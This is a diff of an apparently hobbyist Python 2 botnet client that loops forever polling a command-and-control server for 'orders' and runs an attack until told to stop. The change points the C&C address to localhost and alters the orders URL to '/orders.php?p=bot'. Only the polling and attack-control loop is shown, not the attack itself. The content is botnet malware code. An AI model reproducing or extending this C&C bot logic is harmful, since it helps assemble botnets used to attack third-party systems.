@@ -23,11 +23,11 @@
 import urllib2
 
 
-candc = "192.168.1.56"
+candc = "127.0.0.1"
 
 while(True):
     # get tendril orders
-    orders = urllib2.urlopen("http://" + candc + "/orders").read().split("\n")
+    orders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot").read().split("\n")
 
     # perform action (for extra cuteness)
     doit = orders[0]
@@ -39,7 +39,7 @@ while(True):
         count = 0
         while(True):
             if count%10 == 0:
-                orders = urllib2.urlopen("http://" + candc + "/orders").read().split("\n")
+                orders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot").read().split("\n")
                 if orders[0] == "no":
                     #print "stop attack"
                     break
